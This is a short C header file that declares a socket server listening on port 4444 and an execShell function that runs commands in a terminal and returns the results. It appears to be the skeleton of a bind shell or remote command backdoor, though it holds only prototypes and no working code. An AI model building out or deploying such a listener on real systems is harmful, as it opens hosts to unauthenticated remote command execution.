#include <sys/socket.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>

#define PORT "4444" // Port the server will be opened on
#define MAX 10240 // Max number of bytes to be read from stream
#define BACKLOG 1 // Max pending connections


// Creates a new unbound socket (AF_INET & SOCK_STREAM)
int createSocket();

// Bind a socket
// IPv4, host's local IP, port PORT
// Returns the bound socket on success, -1 on error
int bindSocket(int socketFD, char* port, char* ip);

// Accept connections
// Returns a socket file descriptor on success, -1 on error
int acceptConnections(int socketFD);

// Executes a command in a terminal.
// Returns the result of the command on success, NULL on error.
char* execShell(char* command, char* rv, long max);